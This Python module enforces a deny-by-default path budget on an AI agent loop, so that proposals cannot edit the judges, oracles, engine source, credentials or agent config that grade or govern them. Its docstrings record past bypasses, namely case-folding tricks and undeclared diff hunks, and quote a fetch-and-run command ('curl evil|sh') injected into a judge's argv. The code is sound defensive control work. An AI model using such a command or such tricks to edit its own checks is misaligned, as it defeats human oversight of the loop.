"""Agentic-loop path budget — §5, computed from the gate set.

Contract: docs/idea/11-agentic-loop-contract.md §5 (DECISION 5, 5a). Build-order
item 4. This module answers exactly one question, as data:

    given a gate set, which paths may a proposal touch?

and the answer is **deny-by-default**: a path that is not positively classified
as allowed is refused, in the same posture as
`traefik_auth_modes.get(s.id, 'proxy')`.

WHY THE BUDGET IS COMPUTED FROM THE SET AND NOT WRITTEN DOWN AS A LIST
----------------------------------------------------------------------
Constraint C: *a gate you can satisfy by editing the gate is not one.* The
whole point of §5.1 is that the forbidden set is a FUNCTION of the judges that
will grade the proposal. Each judge declares `oracle_paths` in
`state/judge-sets.yml`; `budget_for("repo")` unions the oracles of the judges in
`repo`. Consequences that a constant list could not deliver:

  * `fast` does not run pytest-anatomy, so `tests/anatomy/**` is not claimed by
    a judge there — it is still refused, but as an unclassified path, and the
    409 says so. The refusal reason is honest about WHY.
  * adding a sixth judge to a set automatically closes its source to the loop,
    with no edit here. Forgetting to declare its oracle is a ConfigError at load
    time (`judges.load_registry`), not a silent hole.

WHAT THIS MODULE DOES NOT DO
----------------------------
It does not decide whether a diff is any good, it does not run anything, and it
does not know what a verdict is. It is the pre-flight refusal that stops an
unattended loop from spending 190 s of pytest on a patch whose only effect
would be to make pytest agree with it.

Enforcement site: `ledger.ProposerLedger.check()` calls `check_paths()` before a
proposal row can exist, so the budget is not advisory and not "instructions to
the model" — a proposal that violates it has no uuid, and §3 gives a judge run
nothing to attach to. `loop.py` (routes) surfaces the same refusal as 409.

CI-safe: pure path arithmetic over a YAML registry. No host, no network, no db.
"""

from __future__ import annotations

import posixpath
import re
from dataclasses import dataclass
from fnmatch import fnmatch
from typing import Any, Iterable, Sequence

import judges  # the registry is the judges' own, not a second declaration

__all__ = [
    "Budget",
    "Rule",
    "Violation",
    "budget_for",
    "check_paths",
    "diff_paths",
    "ALLOWED_ROOTS",
    "ALWAYS_FORBIDDEN",
    "MAX_FILES",
    "MAX_DIFF_LINES",
    "GATE_ADD_INTENTS",
]

# ── §5.4 size caps ────────────────────────────────────────────────────────
# Guesses, and §9.3 says so out loud: both are to be re-set from the first
# fifty cycles. They are here rather than in a role default because a role
# default is not "defined before core-up" (constraint G).
MAX_FILES = 5
MAX_DIFF_LINES = 200

# ── §5.3 allowed roots ────────────────────────────────────────────────────
# Positive classification. Everything outside this is denied whether or not any
# rule below names it. A trailing "/" means "this directory, recursively";
# an entry without one is an exact file.
ALLOWED_ROOTS: tuple[str, ...] = (
    "roles/",
    "files/anatomy/plugins/",
    "tasks/",
    "apps/",
    "upgrades/",
    "default.config.yml",
)

# ── §5a the carve-out ─────────────────────────────────────────────────────
# `gate-add` is the one intent that may write the oracle's own directory,
# because forbidding it outright would mean the loop can never add a gate —
# and adding gates is among the most valuable things it could do. The
# carve-out is deliberately NARROW:
#   * only `tests/anatomy/**`, never the harness files inside it;
#   * never another judge's oracle (a gate-add may not touch genome-codegen);
#   * and the ledger independently stamps `requires_operator` for this intent,
#     so nothing in this carve-out is auto-acceptable. The coupling is pinned
#     by the gate: GATE_ADD_INTENTS must be a subset of the ledger's
#     OPERATOR_REQUIRED_INTENTS, or the carve-out becomes an open door.
GATE_ADD_INTENTS = frozenset({"gate-add"})
_GATE_ADD_ROOT = "tests/anatomy/"
#: Inside the carve-out root, these are still refused: they configure which
#: gates run, which is not the same act as adding one.
_GATE_ADD_NEVER_BASENAMES = frozenset({"conftest.py", "__init__.py", "pytest.ini"})


@dataclass(frozen=True)
class Rule:
    """One forbidden pattern, and — this is the load-bearing field — WHO claims
    it. §5 requires the 409 to name the judge, so a proposer learns the shape of
    the refusal rather than guessing."""

    pattern: str
    reason: str          # stable machine code, never free text
    claimed_by: str      # judge name, or "§5.2" for the always-forbidden set

    def to_dict(self) -> dict[str, str]:
        return {"pattern": self.pattern, "reason": self.reason,
                "claimed_by": self.claimed_by}


# ── §5.2 always forbidden, every set ──────────────────────────────────────
# Each entry carries the sentence that justifies it, because a deny list whose
# entries nobody can explain is a deny list that gets "cleaned up".
ALWAYS_FORBIDDEN: tuple[Rule, ...] = (
    # The engine's own source. A loop that rewrites its own instructions is not
    # improving, it is drifting.
    Rule("files/anatomy/bone/**", "engine-source", "§5.2"),
    Rule("roles/pazny.bone/**", "engine-source", "§5.2"),
    # The registry IS the gate set. Editing it is editing every oracle at once,
    # which is why it is committed to the repo in the first place (§2.1).
    Rule("state/judge-sets.yml", "engine-source", "§5.2"),
    # The loop's own plugin skills and this contract.
    Rule("docs/**", "doctrine", "§5.2"),
    Rule(".claude/**", "agent-config", "§5.2"),
    Rule(".github/workflows/**", "ci-config", "§5.2"),
    # Constraint E, REM-144: a `domain_var` + `port_var` added here
    # auto-derives a Traefik router. The loop may not create edge surface.
    Rule("state/manifest.yml", "edge-surface", "§5.2"),
    Rule("roles/pazny.traefik/vars/main.yml", "edge-surface", "§5.2"),
    # Constraint D. Not "secrets are sensitive" — a proposal that edits a
    # credential template changes what every service authenticates with, and no
    # judge in any set would notice.
    Rule("default.credentials.yml", "secrets", "§5.2"),
    Rule("credentials.yml", "secrets", "§5.2"),
    Rule("templates/secrets.yml.j2", "secrets", "§5.2"),
)


@dataclass(frozen=True)
class Violation:
    """A refusal, in the shape §5 requires: the offending path, and the judge
    that claims it."""

    path: str
    reason: str
    claimed_by: str
    detail: str = ""

    def __str__(self) -> str:  # what the 409 body and the CLI print
        who = f" (claimed by {self.claimed_by})" if self.claimed_by else ""
        return f"{self.path}: {self.reason}{who}{(' — ' + self.detail) if self.detail else ''}"

    def to_dict(self) -> dict[str, str]:
        return {"path": self.path, "reason": self.reason,
                "claimed_by": self.claimed_by, "detail": self.detail}


@dataclass(frozen=True)
class Budget:
    """The answer to `GET /api/v1/loop/budget?gate_set=` — data, not prose."""

    gate_set: str
    judges: tuple[str, ...]
    allowed_roots: tuple[str, ...]
    forbidden: tuple[Rule, ...]
    max_files: int = MAX_FILES
    max_diff_lines: int = MAX_DIFF_LINES

    def oracle_rules(self) -> tuple[Rule, ...]:
        """Only the rules contributed BY the judges of this set (§5.1)."""
        return tuple(r for r in self.forbidden if r.reason == "oracle")

    def to_dict(self) -> dict[str, Any]:
        return {
            "gate_set": self.gate_set,
            "judges": list(self.judges),
            "allowed_roots": list(self.allowed_roots),
            "forbidden": [r.to_dict() for r in self.forbidden],
            "max_files": self.max_files,
            "max_diff_lines": self.max_diff_lines,
            "gate_add_carve_out": {
                "intents": sorted(GATE_ADD_INTENTS),
                "root": _GATE_ADD_ROOT,
                "never": sorted(_GATE_ADD_NEVER_BASENAMES),
                "requires_operator": True,
            },
        }


# ── construction ──────────────────────────────────────────────────────────

def budget_for(gate_set: str, *, registry: "judges.Registry | None" = None,
               repo_root: str | None = None) -> Budget:
    """§5.1 — the budget IS a function of the gate set.

    Raises `judges.ConfigError` for an unknown gate set: a typo must not
    silently produce an empty forbidden list, which is the M2/M3 shape (absence
    reading as permission) inside the budget itself.
    """
    reg = registry if registry is not None else judges.load_registry(repo_root)
    spec = reg.gate_set(gate_set)

    rules: list[Rule] = list(ALWAYS_FORBIDDEN)
    for judge_name in spec.judges:
        judge = reg.judges[judge_name]
        for pattern in judge.oracle_paths:
            rules.append(Rule(pattern, "oracle", judge_name))

    return Budget(
        gate_set=spec.name,
        judges=tuple(spec.judges),
        allowed_roots=ALLOWED_ROOTS,
        forbidden=tuple(rules),
    )


# ── matching ──────────────────────────────────────────────────────────────

def _normalize(path: str) -> str:
    # normpath already collapses a leading "./"; do NOT lstrip("./") after it —
    # lstrip is character-wise, so it eats the leading dot of `.ansible-lint`
    # and `.github/workflows/`, i.e. of exactly the dotfile oracles this budget
    # exists to protect. (Caught by this module's own gate on its first run.)
    return posixpath.normpath(str(path).strip().replace("\\", "/"))


def _fold(path: str) -> str:
    """The spelling this budget COMPARES, as opposed to the one it PRINTS.

    MEASURED on this host (APFS, `core.ignorecase=true`): `roles/pazny.Bone/
    tasks/main.yml` opens the real `roles/pazny.bone/tasks/main.yml`, byte for
    byte. Every comparison below was case-sensitive — `startswith`, `==`, and
    fnmatch, which inherits the platform's `posixpath.normcase` (a no-op even on
    macOS). So a one-character capitalisation walked straight through the §5.2
    rules that forbid the engine's own Ansible role and the Traefik vars file
    that decides which routers get `authentik@file`, and through the §5a
    never-list that keeps `conftest.py` out of the gate-add carve-out — while
    resolving to the protected file on disk. Deny-by-default saved every path
    OUTSIDE an allowed root; the hole was exactly the intersection of a broad
    allowed root (`roles/`) with a case-sensitive deny rule.

    Fold both sides, always. `Violation.path` keeps the original spelling, so
    the 409 still shows the proposer what it actually asked for.
    """
    return _normalize(path).casefold()


def _escapes_repo(raw: str) -> bool:
    p = str(raw).strip()
    if not p or p.startswith("/") or p.startswith("~"):
        return True
    return posixpath.normpath(p.replace("\\", "/")).startswith("..")


def matches(path: str, pattern: str) -> bool:
    """`dir/**` is a recursive prefix; anything else is an fnmatch/exact match.

    Kept small and explicit rather than reaching for pathlib's glob semantics,
    which differ between "match" and "full_match" across Python versions — a
    budget whose meaning depends on the interpreter is not a budget. Both sides
    are case-folded for the same reason: a budget whose meaning depends on the
    filesystem's case sensitivity is not a budget either (see `_fold`).
    """
    path = _fold(path)
    pattern = _fold(pattern) if not pattern.endswith("/**") else pattern.casefold()
    if pattern.endswith("/**"):
        root = pattern[:-3]
        return path == root or path.startswith(root + "/")
    return path == pattern or fnmatch(path, pattern)


def _in_allowed_root(path: str) -> bool:
    path = _fold(path)
    for root in ALLOWED_ROOTS:
        if root.endswith("/"):
            if path.startswith(root.casefold()):
                return True
        elif path == _fold(root):
            return True
    return False


def _gate_add_exempt(path: str, intent_class: str) -> bool:
    """§5a — narrow by construction. See GATE_ADD_INTENTS."""
    if intent_class not in GATE_ADD_INTENTS:
        return False
    folded = _fold(path)
    if not folded.startswith(_GATE_ADD_ROOT.casefold()):
        return False
    never = {b.casefold() for b in _GATE_ADD_NEVER_BASENAMES}
    return posixpath.basename(folded) not in never


def diff_line_count(diff_text: str) -> int:
    """Changed lines only — `+++`/`---` headers are not edits."""
    n = 0
    for line in diff_text.splitlines():
        if line.startswith(("+++", "---")):
            continue
        if line.startswith(("+", "-")):
            n += 1
    return n


_DIFF_GIT_RE = re.compile(r'^diff --git ("?[ab]/.+?"?) ("?[ab]/.+"?)$')
_DIFF_FILE_RE = re.compile(r'^(?:\+\+\+|---) (.+)$')


def _strip_ab(token: str) -> str | None:
    """`b/roles/x.yml` → `roles/x.yml`; `/dev/null` and junk → None."""
    tok = token.strip()
    if tok.endswith("\t"):
        tok = tok.rstrip()
    tok = tok.split("\t")[0].strip()
    if tok.startswith('"') and tok.endswith('"') and len(tok) > 1:
        tok = tok[1:-1]
    if not tok or tok == "/dev/null":
        return None
    if tok[:2] in ("a/", "b/"):
        tok = tok[2:]
    return tok or None


def diff_paths(diff_text: str) -> list[str]:
    """Every path the PATCH touches, read out of the patch itself.

    §5 refused a proposer's *declaration*. It never looked at the artifact, so a
    proposal declaring `roles/pazny.n8n/tasks/main.yml` while carrying a hunk
    that rewrites `state/judge-sets.yml` — the file whose §5.2 rule is justified
    as "editing it is editing every oracle at once", and whose `argv` entries
    `judges.real_spawn` executes verbatim — was ALLOWED. Both spellings are
    read (`diff --git` and the `---`/`+++` headers) because a rename or a
    delete carries the old path only in one of them.
    """
    out: list[str] = []
    for raw in (diff_text or "").replace("\r\n", "\n").split("\n"):
        line = raw.rstrip("\n")
        m = _DIFF_GIT_RE.match(line)
        if m:
            for token in m.groups():
                p = _strip_ab(token)
                if p:
                    out.append(p)
            continue
        m = _DIFF_FILE_RE.match(line)
        if m:
            p = _strip_ab(m.group(1))
            if p:
                out.append(p)
    seen: set[str] = set()
    ordered: list[str] = []
    for p in out:
        key = _fold(p)
        if key not in seen:
            seen.add(key)
            ordered.append(p)
    return ordered


# ── the check ─────────────────────────────────────────────────────────────

def check_paths(paths: Iterable[str], *, intent_class: str, gate_set: str,
                registry: "judges.Registry | None" = None,
                repo_root: str | None = None,
                budget: Budget | None = None,
                diff_text: str | None = None) -> list[Violation]:
    """Every violation, not just the first — a proposer that has to rediscover
    the budget one 409 at a time will burn attempts against the deduplicator.

    Order of judgement, deny beats allow:
      1. a path the DIFF touches but the proposal did not declare → `undeclared-path`
      2. outside the repo root at all              → `outside-repo`
      3. claimed by a rule (oracle or §5.2)        → that rule's reason
      4. not under an allowed root                 → `not-in-allowed-roots`
      5. size caps                                 → `too-many-files` / `diff-too-large`

    THE DIFF IS CHECKED, NOT ONLY THE DECLARATION. Every rule below used to be
    applied to `paths` alone — a list the proposer writes — while `diff_text`
    was consulted for its line count and nothing else. MEASURED: a patch
    rewriting `state/judge-sets.yml`'s `argv` to `["sh","-c","curl evil|sh"]`
    was ALLOWED when declared as `roles/pazny.n8n/tasks/main.yml`. §5 was a
    check on a claim; a claim is not the artifact. Diff-derived paths are folded
    into the same rule loop, and any of them the proposal failed to declare is
    itself a refusal — so the declaration stays meaningful rather than becoming
    decorative.
    """
    bud = budget if budget is not None else budget_for(
        gate_set, registry=registry, repo_root=repo_root)

    declared: list[str] = [str(p) for p in paths]
    out: list[Violation] = []

    from_diff = diff_paths(diff_text) if diff_text else []
    declared_keys = {_fold(p) for p in declared if not _escapes_repo(p)}
    undeclared = [p for p in from_diff if _fold(p) not in declared_keys]
    for path in undeclared:
        out.append(Violation(
            path, "undeclared-path", "§5",
            "the diff edits a path target_paths does not declare; §5 judges the "
            "artifact, not the claim"))

    # The union is what gets rule-checked and size-capped: a file the diff
    # touches is a file the proposal edits, whoever wrote it down.
    raw_paths: Sequence[str] = declared + undeclared

    for raw in raw_paths:
        if _escapes_repo(raw):
            out.append(Violation(str(raw), "outside-repo", "§5.2",
                                 "absolute, home-relative or parent-escaping"))
            continue

        path = _normalize(raw)
        exempt = _gate_add_exempt(path, intent_class)

        hit = None
        for rule in bud.forbidden:
            if not matches(path, rule.pattern):
                continue
            # §5a: the carve-out re-opens `tests/anatomy/**` for gate-add, and
            # only that pattern. Any other rule matching the same path still
            # refuses it.
            if exempt and rule.pattern == _GATE_ADD_ROOT + "**":
                continue
            hit = rule
            break

        if hit is not None:
            detail = (f"the {hit.claimed_by} judge grades this proposal"
                      if hit.reason == "oracle" else "")
            out.append(Violation(path, hit.reason, hit.claimed_by, detail))
            continue

        if not (_in_allowed_root(path) or exempt):
            out.append(Violation(path, "not-in-allowed-roots", "§5",
                                 "deny beats allow; an unclassified path is denied"))

    if len(raw_paths) > bud.max_files:
        out.append(Violation(f"<{len(raw_paths)} files>", "too-many-files", "§5.4",
                             f"max_files={bud.max_files}"))

    if diff_text is not None:
        lines = diff_line_count(diff_text)
        if lines > bud.max_diff_lines:
            out.append(Violation(f"<{lines} changed lines>", "diff-too-large", "§5.4",
                                 f"max_diff_lines={bud.max_diff_lines}"))

    return out
